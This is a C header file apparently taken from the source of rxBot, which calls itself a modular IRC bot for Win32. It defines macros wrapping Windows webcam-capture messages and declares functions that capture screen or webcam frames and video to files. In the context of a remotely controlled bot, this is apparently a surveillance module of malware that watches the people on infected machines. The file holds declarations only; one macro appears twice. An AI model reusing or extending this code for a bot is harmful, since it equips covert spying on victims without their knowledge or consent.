/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#ifndef NO_CAPTURE
#define fAVICapSM(hwnd,m,w,l) ( (fIsWindow(hwnd)) ?   fSendMessage(hwnd,m,w,l) : 0)
#define fcapDriverGetCaps(hwnd, s, wSize)	((BOOL)fAVICapSM(hwnd, WM_CAP_DRIVER_GET_CAPS, (WPARAM)(wSize), (LPARAM)(LPVOID)(LPCAPDRIVERCAPS)(s)))
#define fcapDriverConnect(hwnd, i)			((BOOL)fAVICapSM(hwnd, WM_CAP_DRIVER_CONNECT, (WPARAM)(i), 0L))
#define fcapDriverDisconnect(hwnd)			((BOOL)fAVICapSM(hwnd, WM_CAP_DRIVER_DISCONNECT, (WPARAM)0, 0L))
#define fcapGetVideoFormat(hwnd, s, wSize)	((DWORD)fAVICapSM(hwnd, WM_CAP_GET_VIDEOFORMAT, (WPARAM)(wSize), (LPARAM)(LPVOID)(s)))
#define fcapGetVideoFormatSize(hwnd)		((DWORD)fAVICapSM(hwnd, WM_CAP_GET_VIDEOFORMAT, 0, 0L))
#define fcapSetVideoFormat(hwnd, s, wSize)	((BOOL)fAVICapSM(hwnd, WM_CAP_SET_VIDEOFORMAT, (WPARAM)(wSize), (LPARAM)(LPVOID)(s)))
#define fcapGrabFrameNoStop(hwnd)			((BOOL)fAVICapSM(hwnd, WM_CAP_GRAB_FRAME_NOSTOP, (WPARAM)0, (LPARAM)0L))
#define fcapFileSetCaptureFile(hwnd, szName)((BOOL)fAVICapSM(hwnd, WM_CAP_FILE_SET_CAPTURE_FILE, 0, (LPARAM)(LPVOID)(LPTSTR)(szName)))
#define fcapFileSaveDIB(hwnd, szName)		((BOOL)fAVICapSM(hwnd, WM_CAP_FILE_SAVEDIB, 0, (LPARAM)(LPVOID)(LPTSTR)(szName)))
#define fcapCaptureGetSetup(hwnd, s, wSize)	((BOOL)fAVICapSM(hwnd, WM_CAP_GET_SEQUENCE_SETUP, (WPARAM)(wSize), (LPARAM)(LPVOID)(LPCAPTUREPARMS)(s)))
#define fcapCaptureSetSetup(hwnd, s, wSize)	((BOOL)fAVICapSM(hwnd, WM_CAP_SET_SEQUENCE_SETUP, (WPARAM)(wSize), (LPARAM)(LPVOID)(LPCAPTUREPARMS)(s)))
#define fcapCaptureSetSetup(hwnd, s, wSize)	((BOOL)fAVICapSM(hwnd, WM_CAP_SET_SEQUENCE_SETUP, (WPARAM)(wSize), (LPARAM)(LPVOID)(LPCAPTUREPARMS)(s)))
#define fcapCaptureSequence(hwnd)			((BOOL)fAVICapSM(hwnd, WM_CAP_SEQUENCE, (WPARAM)0, (LPARAM)0L))

BOOL Capture(char *file);
int CaptureFrame(char *file, int index, int x, int y);
int CaptureVideo(char *file, int index, int time, int x, int y);
#endif